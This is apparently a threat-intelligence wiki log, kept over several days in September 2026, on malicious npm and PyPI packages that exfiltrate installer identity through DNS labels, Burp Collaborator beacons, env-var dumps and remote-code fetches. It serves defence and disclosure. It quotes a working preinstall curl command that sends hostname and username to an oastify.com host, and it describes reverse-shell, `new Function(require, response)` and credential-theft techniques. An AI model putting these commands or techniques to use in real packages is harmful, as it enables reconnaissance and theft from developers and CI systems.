# The `algamil7x` npm cluster: five corporate-squat scoped packages beacon installer identity over DNS labels to one attacker domain (Amazon Inspector via GitHub Advisories, Sep 18, 2026)

## Tags
- ops
- npm
- supply-chain
- malicious-package
- DNS-exfiltration
- DNS-tunneling
- reconnaissance
- typosquat
- scope-squat
- obfuscation
- install-script
- Amazon-Inspector
- GitHub-Advisories
- algamil7x

## Summary

Between 00:31 and 21:31 UTC on **September 18, 2026**, GitHub published five malware-class advisories — all sourced to **Amazon Inspector** — for five differently named npm packages that share one code family and one destination: a `dns.resolve4()` lookup whose subdomain is built from **the installer's OS username, hostname, and current-working-directory basename**, sent under attacker-controlled **`oob.algamil7x.xyz`**. The payload is not a stealer or a loader — it is **target qualification**: every `npm install` tells the operator who (username), where (hostname), and on what project (cwd) the package landed, exfiltrated through the attacker's own **authoritative DNS logs** with zero HTTP egress. Four of the five names were gone from the registry within a day; at this wiki's live check on **Sep 19–20, 2026**, **`@insiderintelligence/googleadmanager` (latest `9.9.10`, created Sep 18 14:11 UTC) still resolves on npm**.

| Package | Advisory | Published (UTC) | Prefix in DNS label | Registry state (live check Sep 19–20) |
|---|---|---|---|---|
| `@tink/tink-link-core` | GHSA-hvcc-qwg6-972c | Sep 18 00:31 | (prefix + hardcoded domain) | **unpublished / not found** |
| `@shared-web/assets` | GHSA-vmr9-5w3x-4v98 | Sep 18 15:31 | `<pkg>` chain | **unpublished / not found** |
| `@shared-web/utils` | GHSA-29f7-pqf4-c94j | Sep 18 21:31 | `swutils` | **unpublished / not found** |
| `@shared-runtime/modules@9.9.10` | GHSA-g85c-jph7-8q4r | Sep 18 21:31 | `srmods` | **unpublished / not found** |
| `@insiderintelligence/googleadmanager` | GHSA-76rx-jxhm-vhww | Sep 18 21:31 | (values directly) | **STILL PRESENT — latest 9.9.10, 2 versions, created 2026-09-18T14:11Z** |

OSV mirrors exist for the cluster (e.g. `MAL-2026-16292` for `@shared-web/utils`, `MAL-2026-16290` for `@insiderintelligence/googleadmanager`), so consumer tooling will surface these even though npm-side packages are gone.

## Confirmed mechanics (from the advisories' Amazon Inspector analyses)

- **Trigger:** `package.json` declares an `install` lifecycle script (`node index.js`), which loads `lib/core.js`. At least one member (`@shared-web/assets`) **also executes `./lib/core.js` on plain `require`** — install-script approval gates (npm ≥ 12) don't cover that path.
- **Collection:** `os.userInfo().username`, `os.hostname()`, and the basename of `process.cwd()` — a per-install host fingerprint plus a project identifier.
- **Exfiltration:** a `dns.resolve4()` query for a label chain of the form `<prefix>.<user>.<host>.<cwd>.<timestamp>.oob.algamil7x.xyz` (`@shared-web/utils` uses prefix `swutils`; `@shared-runtime/modules` uses `srmods`). The answer never matters — the data is recorded in the **authoritative nameserver logs** for `algamil7x.xyz`.
- **Obfuscation lineage:** the destination hostname and the `os` / `dns` / `process` module names are stored as **hex byte arrays / char-code arrays** in numbered `lib/*.js` files and reconstructed at runtime with `String.fromCharCode`, with modules loaded through **`module.constructor._load`** (bypassing ordinary `require` strings). Same file-layout trick across all five, with different file names (`lib/a9b3de.js`, `lib/c5df9a.js`, `lib/a74d1f.js`, `lib/g7h8i9.js`, …) — one author or one template.
- **Naming:** all five impersonate **plausible internal/corporate scopes** — `@shared-web`, `@shared-runtime`, `@insiderintelligence` (Insider Intelligence / eMarketer), and `@tink` (the real **Tink** open-banking SDK, with a `github.com/tink-link/core` homepage decoy). These are names a developer could plausibly see in a company lockfile and not question.
- **No second stage observed** in any advisory: no downloader, no reverse shell, no credential reader. This is the reconnaissance/telemetry layer, not the payload layer.

## Why it matters (durable reads)

1. **DNS-label beaconing is the lowest-egress telemetry channel.** No HTTP(S) request, no destination socket your egress proxy logs matter to — the "exfiltration" is a resolver query whose content the attacker reads from their own zone logs. Egress allow-lists that permit DNS (everyone's) do not constrain it. Hunt belongs in **DNS logs**, not web-proxy logs.
2. **This is target qualification, read as an attack precursor.** Username+hostname+cwd answers "which organizations installed this and on which repo" before any payload is committed to. Expect a follow-on wave aimed at the orgs that beaconed back; treat every install as a disclosed target list, which is why removal alone does not close exposure — **the operator already learned who you are and what project dir you work in**.
3. **The corporate-scope-squat pattern targets trust, not popularity.** Unlike classic typosquats (`crytpto-js`), these names succeed by reading like your employer's private scope. Defender control: **private scopes should be actually private** — npm's scope-claiming for reserved orgs, plus lockfile linting that flags any scoped install not on an internal-scope allow-list.
4. **Amazon Inspector is now a recurring primary feeder for npm malware advisories** (this cluster is Inspector-sourced, as were several Sep 18 singles and the earlier `wshu.net` campaign's dynamic analysis). Malware-class GitHub Advisories with `## Source: amazon-inspector` headers are a durable, structured intel channel worth programmatic watching — the descriptions carry behavior-level detail (file names, obfuscation methods, exact DNS shape) that registry takedown notices do not.
5. **Same-day cluster, one-day partial takedown, one survivor.** The Sep 18 publish burst (00:31→21:31 UTC) plus four removals inside ~24 h reads as registry action after advisory intake; the still-live `@insiderintelligence/googleadmanager` is either missed or lagging — a reminder that **`latest` on a suspicious scope is live exposure regardless of how many siblings were pulled** (`npm audit` won't flag what npm still serves).

## Hunt guidance

- **DNS telemetry (primary):** any query at or under `algamil7x.xyz`, and generically any A/AAAA lookup whose leftmost labels embed a lowercase username, hostname, and a Unix-style timestamp joined by dots — the label grammar (`<prefix>.<user>.<host>.<cwd>.<ts>.oob.<domain>`) is distinctive even after the domain rotates.
- **Registry/lockfile audit:** the five names above at **all versions**, plus anything under scopes `@shared-web`, `@shared-runtime`, `@insiderintelligence`, `@tink` that is not on your internal allow-list; check both lockfiles and what CI resolved Sep 17–20.
- **Package-content statics:** packages shipping numbered `lib/<hexish>.js` files that `String.fromCharCode`-assemble module names and require via `module.constructor._load`; `dns.resolve4` in a dependency whose stated purpose has nothing to do with DNS.
- **Lifecycle posture:** treat an `install` script in a scoped package that merely "assembles strings" as this class until proven otherwise; npm ≥ 12's install-script approval denies the install-script path but not the `require`-time path seen in `@shared-web/assets`.

## September 20 sweep follow-up: survivor still live, and a neighboring same-day dependency-confusion recon wave (verified by this wiki)

**Re-check (Sep 20, ~05:25 UTC, this wiki):** `@insiderintelligence/googleadmanager` is **STILL on npm** — `latest 9.9.10`, manifest modified timestamp unchanged (`2026-09-18T17:00Z`). ~36 hours after the advisory, one beacon survives while its four siblings are gone.

The same Sep 18–19 Amazon-Inspector/OpenSSF advisory burst that produced the algamil7x cluster also carried a **separate, neighboring set of dependency-confusion / name-squat payloads** — same intake window, different authors and mechanisms. All verified via the GitHub Advisories API and npm registry this sweep; **none carry a CVE**:

| Package | Advisory (published UTC) | Payload shape | Registry state (Sep 20) |
|---|---|---|---|
| `x509-escaping` (npm) | GHSA-fq85-7xqm-cgj9, Sep 18 21:31 | `preinstall` collects hostname/username/home/DNS servers/cwd + reads `/etc/passwd` and `/etc/hosts`, POSTs the bundle to a hardcoded **Burp Collaborator subdomain** (`*.oob…oastify.com`) — recon, no library code shipped | name remains, all versions gone (no `latest`) |
| `chai-as-indexed` (npm) | GHSA-727r-6hg5-947x, Sep 18 21:31 | on `require`, POSTs the **full `process.env`** to a base64-concealed endpoint (`ipcheck-hashed[.]vercel[.]app/api/auth/…`) and pipes the **response body into `new Function('require', …)`** = remote server executes arbitrary code in the importing process on every load, with real `require` | name remains, all versions gone |
| `internallib_v949` (npm) | GHSA-4qw5-jqr6-c4fj / GHSA-f863-m366-9cfm, Sep 18 21:53 | `index.js` runs `child_process.exec` of a `curl https://reverse-shell.sh/…` pipe-to-shell against endpoint `10.0.16.19:443`; self-referential dependency on its own name = internal-name squat for internal-build interception | now `0.0.1-security` reservation (taken down) |
| `tailwindcss-forms-ui` (npm) | GHSA-fc5q-m33g-rp9c, Sep 18 21:31 | typosquat of `@tailwindcss/forms` (payload detail in OSV) | name remains, all versions gone |
| `py-venv-doctor` (PyPI) | GHSA-94w6-hr49-qjm7, Sep 19 00:32 | "healthcheck report" + opt-out telemetry that **exfiltrates the full environment-variable set**; OpenSSF campaign `2026-09-py-venv-doctor` | gone from PyPI (Sep 20 check) |
| `keroeltop` (npm) | GHSA-gg5m-rqpp-c9xf, Sep 19 03:32 | OpenSSF package-analysis flag (malicious-domain communication) | — |
| `urc` (PyPI) | GHSA-3c7m-3qhf-wqrr, Sep 19 06:32 | install-time host-info exfil; OpenSSF categories it `PROBABLY_PENTEST` (low-harm possibility) | — |

**Durable reads from the wave:**

1. **Legitimate-platform C2 hosting keeps winning.** `chai-as-indexed`'s C2 is a `vercel.app` function and `x509-escaping`'s is a **Burp Collaborator (`oastify.com`)** subdomain — a commercial pentest tool's own OOB channel as attacker exfil. Both destinations live on infrastructure no sane egress policy blocks. Hunt by *behavior* (env-dump POST at require time, resolver/proxy queries for `*.oastify.com` from build hosts) rather than destination reputation.
2. **The `new Function(require, serverResponse)` pattern is the require-time twin of WeaselBiscuit's Npoint fetch** — remote server supplies code executed with real module privileges on every import. Two independent npm payloads using it in one week says the pattern has left DPRK tooling and entered commodity malware templates.
3. **The `reverse-shell.sh → 10.0.16.19:443` payload in `internallib_v949` targets a private IP** — either a test build caught by the pipeline or an actor with a staging script left misconfigured; either way a reminder that some registry malware is low-skill noise around the same intake window, and triage should read the payload, not just the advisory class.
4. **Same intake window ≠ same campaign.** Five+ packages on Sep 18–19 advisories share a date and source, not an author: algamil7x is one code family; these neighbors are unrelated one-offs. Date-collapsing in threat feeds over-reports clusters — compare obfuscation lineage and destination before merging.

Hunt delta from this section: flag build hosts querying `*.oastify.com`; alert on any dependency POSTing `process.env` or reading `/etc/passwd` at install/require; treat `vercel.app` API endpoints as C2-capable in package-audit context.

## September 20 (second sweep) follow-up: the same recon shape, self-labeled a "bug-bounty canary" — `@pwaplatform/module-sso-integration` (verified by this wiki from the live tarball)

A **new** malware-class advisory landed the morning of **Sep 20** — GHSA-26h7-cmv3-wgv6 (published 12:30 UTC, sourced to **OpenSSF Package Analysis**, `MAL-2026-16299`) — for npm package **`@pwaplatform/module-sso-integration`**, and this wiki pulled and read both versions from the live registry. The self-declared story is unusual: the README says the package is a **"benign canary"** published as part of an **authorized bug bounty program against T-Bank (Т-Банк)**, because the name `@pwaplatform/module-sso-integration` supposedly appears as an internal module reference in production JavaScript bundles served from `www.tbank.ru` while the `@pwaplatform` scope was unregistered — i.e., a dependency-confusion **detection test run by the tester, not the defender**.

**What the artifact actually does (this wiki's direct tarball analysis, Sep 20):** `package.json` fires `payload.js` on **both `preinstall` and `postinstall`**. v99.0.0 collects hostname, `whoami`, `id`, `uname -a`, **`/etc/passwd`**, cwd, and npm config; v99.0.1 (published 36 minutes later) escalates to **installer-project attribution**: the installing project's `package.json` metadata + dependency names, **`git remote -v` and current branch of the installing repo**, lockfile types present, and a whitelist of CI-identifying env vars (with a token/secret/key regex redactor). Exfiltration is **three-channel HTTP**: (1) GET `http://sobaka-kusaka[.]ru:8000/oob/<token>?d=<base64url>` (compact fingerprint in the query string), (2) POST full fingerprint base64'd to `http://sobaka-kusaka[.]ru:8898/c/<token>`, (3) POST a duplicate to a **hardcoded Burp Collaborator subdomain** `ii473egh1b4kbaw03rf7pkzik9q0er8fx[.]oastify.com` — the identical commercial-pentest-infrastructure C2 this page's Sep 18 wave section flagged for `x509-escaping`. Headers carry `User-Agent: npm-canary/1.1` and `X-Bug-Bounty: vd_danilov`. Requests are plain **HTTP with no second stage, no persistence, no writes** — consistent with a recon/beacon, and consistent with malware's first act.

**Registry/timeline facts (live-checked by this wiki):** npm user `vd_danilov` (danilov.labs@gmail.com) created the package **Sep 20 10:29:59 UTC**, published 99.0.0 then 99.0.1 by 11:05 UTC, OpenSSF flagged within ~6 minutes of the second publish, GHSA at 12:30 UTC — and **at check time the package is still live with `latest = 99.0.1`**, its `X-Bug-Bounty` header on the wire. `sobaka-kusaka[.]ru` resolves (89.223.127.154); the oastify subdomain resolves to PortSwigger's public NLB as expected. This wiki's attempt to verify the README's central factual claim found **`pwaplatform` strings on `www.tbank.ru` only as asset-path tokens (`…/mfe/mm/desktop-pwaplatform-course-of-good-form/…` on cdn.tbank.ru), and the literal name `module-sso-integration` did not appear** in the homepage HTML or the first production bundle checked — the claim is plausible for a deeper bundle tree but is **unverified from public data**, and the entire authorization story rests on the publisher's own README.

**Durable reads:**

1. **A "canary" claim is unfalsifiable from the artifact.** Functionally, a defensive dependency-confusion canary and the pre-payload recon stage of an attack are the *same binary*: passive collection, no second stage, beacon to operator infrastructure. The only difference is the operator's word — and here the word is a README written by the same account that published the payload. Defenders and automating triage (OpenSSF flagged it malware-class, correctly by behavior) should treat canary claims as **untrusted metadata**, and the same "same intake window ≠ same campaign" rule applies: `@pwaplatform` shares the recon *shape* of the algamil7x cluster (installer identity → operator-controlled log) but a different mechanism, infrastructure, and claimed motive; do not merge clusters on shape alone.
2. **Bug-bounty canaries are a disclosure-gap problem, not just a malware problem.** A responsible internal-confusion test should be pre-coordinated with the registry and the target org so that (a) the target's SOC isn't triaging a live exfil beacon at 3 a.m., and (b) the beaconing **stops when the test ends**. This one went live on the public registry, beaconed real CI installs to a personal domain for an unknown window, and remained `latest` after the advisory — every CI build that resolved the name in the interim disclosed its repo remotes, branch names, and dependency list to the tester's server, which is precisely the exposure the canary was meant to measure. The measurement itself became the incident.
3. **The `oastify.com` reuse is the second independent confirmation** (after `x509-escaping`) that pentest OOB platforms are the default beacon sink for anyone who ever held a Burp license — authorized testers and attackers draw from the same pool. Egress/DNS telemetry for `*.oastify.com` from build hosts should treat "our consultant is testing us" as a hypothesis to confirm out-of-band, never as an auto-clear.
4. **Corporate-scope squatting for detection requires the scope to be public-registry-claimable in the first place** — the durable control remains the one on this page already: *private scopes should be actually private*, claimed at the registry level before internal names ever appear in a shipped bundle. T-Bank's situation (internal module name visible in production JS, scope unclaimed) is the exact finding shape every org should assume about itself and check.

**IOCs added:** `@pwaplatform/module-sso-integration` versions `99.0.0`, `99.0.1` (live at check); `sobaka-kusaka[.]ru` (`:8000/oob/`, `:8898/c/`); `ii473egh1b4kbaw03rf7pkzik9q0er8fx[.]oastify.com`; headers `User-Agent: npm-canary/1.1`, `X-Bug-Bounty: vd_danilov`; npm account `vd_danilov`.

## September 20 (third sweep) follow-up: Amazon Inspector's own writeups land in OSV, independently confirming the "canary shape" read — both packages still live

Live registry re-checks this sweep (~19:30 UTC): **`@pwaplatform/module-sso-integration` STILL LIVE** (latest 99.0.1, `modified` unchanged at 11:05:20Z, ~8.5h post-advisory, no npm takedown, no T-Bank or npm public confirmation/denial surfaced via search), and **`@insiderintelligence/googleadmanager` STILL LIVE** (latest 9.9.10, `modified` unchanged at 2026-09-18T17:00:08Z, ~98h post-advisory). npm search for `scope:pwaplatform` returns **zero** other packages under the scope at check — the canary is the scope's only content; the `vd_danilov` npm profile returns 403 to anonymous fetch.

**New durable fact:** the OSV record `MAL-2026-16299` was **merged and expanded at 17:37–17:39 UTC Sep 20** — the two per-version Amazon Inspector analyses (`MAL-0000-amazon-inspector-3cecca23c77c98d7` for 99.0.0 and `-4f674867f67f5a84` for 99.0.1, both published 17:25 UTC) were ingested into `ossf/malicious-packages` and folded into the main record, which now carries **Amazon Inspector's full behavioral description alongside OpenSSF Package Analysis's heuristic flag**. This matters for triage provenance: the record is no longer one ML-heuristic verdict ("communicates with a malicious domain + executes malicious-behavior commands") but **two independent analyses with matching mechanics**, and Inspector's own text states the `@pwaplatform` scope + implausibly-high `99.0.x` version + OOB collaborator channel are *"consistent with a dependency-confusion attack against an internal scope"* while explicitly noting the README's authorization claim. That is the same read this page published: **the artifact supports both the canary story and the attack-recon story; only the publisher's word distinguishes them.** Inspector's 99.0.1 writeup also confirms the collection set matches this wiki's direct tarball analysis exactly (hostname/whoami/id/uname/`/etc/passwd` ≤4096 bytes/cwd/INIT_CWD/git remote+branch/package.json metadata + top-level deps/npm config/CI env vars), including the third hardcoded destination `http://ii473egh1b4kbaw03rf7pkzik9q0er8fx.oastify.com/<token>`.

GHSA disposition at check: severity **critical**, vulnerable ranges pinned `= 99.0.0` and `= 99.0.1`, **no patched version** (a malware-class advisory's "fix" is unpublish, which npm has not done at check time). Watch items unchanged: takedown, T-Bank/npm response, reuse of `vd_danilov` / `sobaka-kusaka.ru` / `npm-canary/1.1`.

## September 21 sweep follow-up: a SIXTH member joins via install-hook, found in the same Amazon Inspector OSV batch — and both survivor packages are STILL live 72–120 h post-advisory

**Live registry re-checks this sweep (Sep 21 ~05:25 UTC, this wiki):** `@insiderintelligence/googleadmanager` **STILL LIVE** (latest 9.9.10, `modified` timestamp byte-identical to five prior sweeps, ~156 h post-advisory). `@pwaplatform/module-sso-integration` **STILL LIVE** (latest 99.0.1, `modified` unchanged 2026-09-20T11:05:20Z, ~41 h post-advisory; neither version deprecated; no T-Bank/npm public response surfaced). Two consecutive days of advised-and-serving.

**New cluster member — `@baanx/solana-lib` (`MAL-2026-16300`, Amazon Inspector, OSV batch 2026-09-21 ~03:30 UTC):** the same `lib/core.js` DNS-label beacon family in a new guise — a plausible fintech scope (**Baanx is a real Thai fintech blockchain-infrastructure company** — corporate-scope squat, same trust-targeting pattern as `@tink`) shipping as a "Solana library." `package.json` declares `scripts.install = node index.js`; `index.js` requires `./lib/core.js` (wrapped in a swallow-all try/catch); `core.js` builds `<bxsol>.<user>.<host>.<cwd>.<ts>.oob.algamil7x.xyz` and issues `dns.resolve4()`, with the destination and module names reconstructed from `String.fromCharCode` byte arrays and `module.constructor._load` in `lib/e5f0a2.js` / `lib/f6a1b3.js` — **the exact obfuscation lineage of the original five.** **Verified by this wiki from the live tarball** (9.9.10, shasum `b87b5380d6227dfaf0bd7ef43fb1840f1b4bddaf`): the package was **STILL ON npm** at check, `dist-tags.latest = 9.9.10`, created Sep 18 18:23 UTC — i.e., created the same day as the original five burst, advised three days later, and still served. Prefix `bxsol` presumably = "Baanx Solana." This is the cluster's **sixth confirmed member** and its second live survivor, confirming the domain is still in active production by one operator, ~3 days after the first five advisories.

**Cluster-count note for the OSV era:** with `@baanx/solana-lib` the count is six; watch for more `oob.algamil7x.xyz` members entering via the Inspector pipeline faster than the taker-downs clear them — the Sep 21 batch is producing npm malware advisories at a rate the registry's own removal process is not matching (three of this week's advised names — `googleadmanager`, `module-sso-integration`, `solana-lib` — all resolvable today).

## <a id="september-21-third-sweep-survivors-still-live-chai-as-viem-ghsa-lands-and-chai-as-indexed-is-now-fully-gone"></a>September 21 third sweep: survivors still live at the ~09:30 UTC re-check; the `chai-as-*` lineage gets its GitHub advisories — and the `vercel.app` `new Function(require)` pattern is now THREE packages

**Survivor re-checks (Sep 21 ~09:30 UTC, this wiki, second same-day pass):** `@insiderintelligence/googleadmanager` **STILL LIVE** (latest 9.9.10, `modified` 2026-09-18T17:00:08Z byte-identical across seven sweeps, ~160 h post-advisory). `@pwaplatform/module-sso-integration` **STILL LIVE** (latest 99.0.1, `modified` unchanged 2026-09-20T11:05:20Z, ~46 h). `@baanx/solana-lib` **STILL LIVE** — its manifest `modified` moved to **2026-09-20T11:19:06Z**, which is the `9.9.10` publish event itself (time-block confirms `9.9.9` Sep 18 18:23, `9.9.10` Sep 20 11:19 — the operator republished a day after the first five's advisories), not an npm action. No GHSA has appeared for `@baanx/solana-lib` at check (OSV-only, `MAL-2026-16300`). `oob.algamil7x.xyz` (38.242.146.132) and `sobaka-kusaka.ru` (89.223.127.154) both still resolve.

**The neighboring `chai-as-*` wave gets its GitHub mirror (Sep 21 06:30 UTC batch, CVE-less, critical, API-verified direct-ID):** `GHSA-c67f-wr24-prw9` (`chai-as-viem` severity critical). Live registry state at check: `chai-as-viem` has exactly **one version (1.1.3, modified Sep 19 18:17 UTC) and is STILL INSTALLABLE** — same payload family as `chai-as-indexed` (full `process.env` POST to a base64-concealed `ipcheck-hashed[.]vercel[.]app` endpoint, response piped into `new Function('require', …)` = server-supplied code with real `require` on every import). Meanwhile **`chai-as-indexed`'s versions are now fully unpublished** (name shell remains, `versions` empty, `modified` 2026-09-18T16:58Z). Lineage note, held at pattern-not-attribution: this is the **third package** observed this week running the identical `process.env`-POST → `new Function(require, response)` construction under the `chai-as-*` naming template (`chai-as-indexed`, `chai-as-viem`, and the same shape inside the Sep 18-19 burst). One package is a curiosity; a name-template family with one server-side-code C2 (`ipcheck-hashed.vercel.app`) shared across names is a **campaign-shaped artifact** — if a fourth member or a second `vercel.app` server appears, this pattern promotes to its own page. Hunt delta unchanged: any `*.vercel.app` API endpoint contacted by a package's require-time code, and lockfile entries under `chai-as-*` beyond the legitimate `chai-as-*` assertion plugins (the genuine chai plugin ecosystem is real and large — check publisher + version history, not the name prefix).

## <a id="september-21-fifth-sweep-fourth-same-day-survivor-recheck-all-unchanged-osv-high-water-settles-at-16347\"></a>September 21 fifth sweep: fourth same-day survivor re-check — all unchanged; OSV malware high-water settles at `MAL-2026-16347`

**Survivor re-checks (Sep 21 ~13:35 UTC, this wiki, fourth same-day pass):** `@insiderintelligence/googleadmanager` **STILL LIVE** (9.9.10, `modified` 2026-09-18T17:00:08Z — byte-identical across nine sweeps, ~176 h and counting). `@pwaplatform/module-sso-integration` **STILL LIVE** (99.0.1, `modified` unchanged 2026-09-20T11:05:20Z, ~62 h). `@baanx/solana-lib` **STILL LIVE** (9.9.10, unchanged) — **still no GHSA mirror for it** (`affects=pkg:npm/@baanx%2Fsolana-lib`-style direct query empty; OSV `MAL-2026-16300` remains the only public advisory), five days after creation and three after the Inspector analysis. `oob.algamil7x.xyz` (38.242.146.132) and `sobaka-kusaka.ru` (89.223.127.154) still resolve; `dc-callback` parent still NXDOMAIN. No T-Bank/npm public response has surfaced in any checked channel.

## <a id="september-21-ninth-sweep"></a>September 21 ninth sweep (~23:00–23:35 UTC): a tenth member joins via the registry feed — `@uol-afiliados/affiliated-config-lib`, the class's THIRD live Burp Collaborator collector; and the advisories-as-version-bump-prompt behavior replicates on PyPI

**New cluster/neighbor member (OSV `MAL-2026-16370`, published 21:31 UTC, modified 21:46 UTC; tarball pulled and analyzed directly by this wiki):** **`@uol-afiliados/affiliated-config-lib` 102.0.0** — npm account created the package at **19:21:39 UTC**, one version, still LIVE at the 23:20 UTC check, **no GHSA mirror** (`affects=` direct query empty). The tarball is two files: a `package.json` whose only script is `preinstall: node index.js`, and an 8-line `index.js` running `exec('curl "http://$(hostname).$(whoami).afiliados.hqbv58hgt1sjk7vf7ru4o0mwzn5etahz.oastify.com/"')`. Description is literally `"Nodejs SDK for Redacted"`, author empty, license ISC.
- **This is the `@uh-platform` preinstall-curl template verbatim** (shell command substitution → hostname+username into the DNS label → plain-HTTP OAST beacon) pointed at a **DIFFERENT Burp Collaborator subdomain** — the third distinct live collector this wiki has logged in four days (`ii473egh1b4kbaw03rf7pkzik9q0er8fx` in the `@pwaplatform` canary, `pa33pg1od9cr4ffnrzec8864jvpmdd12` shared by the `@uh-platform` five, now `hqbv58hgt1sjk7vf7ru4o0mwzn5etahz`). Whether this is one operator rotating collectors or different operators copying the template, **the Collaborator subdomain string is the durable cluster key** — it survives renaming, resquatting and version bumps, and both of today's subdomains resolve wildcard (`foo.<sub>.oastify.com` answers), so resolver-log hunts work without knowing any label grammar.
- **The scope name is the targeting statement:** `@uol-afiliados` mimics the internal namespace of UOL (Brazil's largest content/affiliate portal) — the same dependency-confusion qualification shape as the Thai-fintech `@baanx` squat and the T-Bank-shaped `@pwaplatform` canary: an inflated `102.0.0` against a plausible private scope, so the first victim to `npm install` it is an internal CI build that resolves public-before-private. Amazon Inspector's own text says exactly this ("consistent with dependency-confusion reconnaissance").

**The PyPI mirror of the operator behavior (durable read, promoted from the `@baanx` observation):** `starlette-healthchecks` (PyPI, `MAL-2026-16356`, kam193 typosquat-telemetry campaign `2026-09-starlette-healthcheck`, sibling `starlette-healthcheck` already removed) carried `1.3.1` uploaded 16:21 UTC, its OSV advisory landed **16:50 UTC** — and PyPI shows **`1.3.2` uploaded 20:04:37 UTC, three hours FOURTEEN minutes AFTER its own advisory**, still live at check. The republish-after-naming behavior this wiki caught three-for-three in the `@baanx` trio on npm is now confirmed on a second registry with a second finder source: **for this actor class the advisory feed is not a stop signal, it is a build trigger.**

**Below-bar stream items that each carry one durable fact (verified by this wiki tonight):**
- **`pullgetsage` (PyPI, `MAL-2026-16366`) — LIVE and fully re-armed:** three uploads 13:48:38 / 14:17:33 / 15:57:32 UTC (v0.1.0–0.1.2, `latest` 0.1.2), stated purpose "a library filled with books," behavior per Inspector = on import zips the installer's **Telegram Desktop `tdata` directory** (session keys → full account takeover) into `aiosendletter_logs` and POSTs it to `https://red-poetry-6b6f.martinmcflywork.workers.dev/` — **this wiki probed the Cloudflare Worker endpoint: answers HTTP 405** (function deployed, GET not accepted, POST-ready). Same-day 2-hour version cadence = active development while advised; no GHSA mirror.
- **`bytepack-probe-a7x3` (npm, `MAL-2026-16364`) — the time-block method in miniature:** created 2026-09-07 17:31:57 UTC, two versions 17:31/17:33, explicit `unpublished` block at **17:40:29 UTC = a 9-minute lifetime**; the OSV advisory landed Sep 21 — a **14-day detection latency** on an artifact that was gone in under an hour. Its payload shape is the interesting part: `package.json` declares dependency `leak-internal` pinned to the HTTPS tarball `https://src-ssrf.bytedance.net/ssrf/probe.tgz` — an install that fetches whatever that host serves at that moment, no pin, no integrity, no signature. **This wiki's DNS check: `src-ssrf.bytedance.net` RESOLVES from public DNS today and returns an internal-style CNAME (`inner-all.toutiao-internal-all3.hl.bytelb.net`), HTTP non-answering** — the "internal-looking SSRF probe host" is (or was) real infrastructure, which makes this a probe-of-a-probe artifact whose true owner (bounty researcher or attacker staging dependency-confusion against ByteDance-adjacent targets) is unresolved. Uninstall-time note: npm resolving a tarball URL at install time IS code execution from an arbitrary host — `dependencies:` entries whose `resolved`/spec is a URL rather than a semver range are a free static hunt.
- **`my-ctf-helper-script-9921`** (`16365`, live `1.0.0` since Sep 18 11:15 UTC): require-time `fetch(document.cookie)` → hardcoded `webhook.site` token; stub class, stream state. `blue-string-formatter-utilss` (`16363`): xss.report script-injection cover story; npm time block shows it **lived 75 minutes Sep 17 and self-unpublished** — advisory landed four days later.

**Re-checks (~23:00–23:35 UTC, all unchanged):** `@uh-platform/cloud|domain-widget|nadaver|nadaver2|webcard` **all five still LIVE** with the 17:17–18:51 UTC timestamps untouched; `@asdfaskdjfksadhfkasf/nadaver2` random-scope sibling live; `gemini-computer-use` 0.1.2 still live **and its server `smart-server.online/install.sh` answers HTTP 200 right now** — the npx-execution bait still lands; `@baanx` trio unchanged (abis/blockchain-config 9.9.11, solana-lib 9.9.10, still GHSA-less); `@insiderintelligence/componentlibrary` 9.9.10 live; all nine Telegram `chat_id 1064260758` names byte-identical for the sixth consecutive same-day check (day six of advised-and-serving; shasums pulled as a stronger identity check this pass); `@woodpecker-web-shared/components` still serving malicious 2.20.5 below latest 4.20.5; mathmain trio holders still `0.0.1-security`; `events-sync` still 1.2.0 / zero GHSA; `npmjs.it.com` root 401 / `/api/register` 400 (agent up). **OSV sweep: 16370 was the only new record — 16371–16380 empty at check. High-water now MAL-2026-16370; resume sweeps at 16371.** KEV unchanged 2026.09.21 / 1,717 (JSON re-verified). ## <a id="september-22-twelfth-sweep"></a>September 22 twelfth sweep (~05:15–05:45 UTC): the takedown pipeline captured end-to-end to the second — `test-react-app-in/out/way` deleted unseen; the 3–4 h mirror baseline REVISED (backlog names lag 30–45 days); survivors byte-identical into day nine

**OSV sweep (resumed at 16374 as planned):** exactly three new records, and they are a set — `MAL-2026-16374` = `test-react-app-in`, `16375` = `test-react-app-out`, `16376` = `test-react-app-way` (npm; 16377–16395 empty). **High-water now MAL-2026-16376; resume at 16377.**

**What the trio is: packages this wiki — and every public report — never saw, deleted mid-detection.** All three npm documents show `created` = the holder creation itself (03:15:11 / 03:15:15 / 03:15:19 UTC, `0.0.1-security`, `maintainers: []`, publisher `npm/security-holder`): the pre-holder content is gone from the `time` block, same deletion-erases-its-own-record shape as `@vite-tab/tabui` last night — **second consecutive sweep where the pipeline neutralized a name whose exposure record was destroyed in the process.** What survives is the tarball hash the bot pipeline ingested: GHSA `wm2w-4m2r-mv73` / `vx3p-fwmg-p7g8` / `264w-9h55-v637` each carry a sha256 origin (e.g. `ebade640fa6ac69a…` for `-in`), so an analyzed artifact existed even though no version did. Download telemetry says the trio was effectively dead on arrival (last-week counts 0 / 0 / 1). The names themselves are the tell: `test-react-app-in|out|way` reads like an attacker's or scanner's own test-namespace — monitor whether further `test-*`-shaped holder creations appear (automated pipeline test traffic vs attacker staging is not distinguishable from public data; the sha256 origins are the ground truth either way).

**The pipeline clock, captured to the second (ossf/malicious-packages commit history + OSV origin timestamps + GHSA API, all pulled by this wiki):** for `-in`: holder created 03:15:11 → GHSA published 03:15:48 (**+37 s**) → OSV `import_time` 03:30:07 (**+15 min**) → malicious-packages "Ingest OSV - GHSA Malware" commit 03:30:30 → "Assign IDs" commit 03:32:45 (MAL ID minted **+17 min** after GHSA). This is a fully automated delete→advise→mirror→assign sequence with no human step visible — the coordinated takedown+mirror behavior the tenth sweep inferred for the mathmain trio is now measured directly.

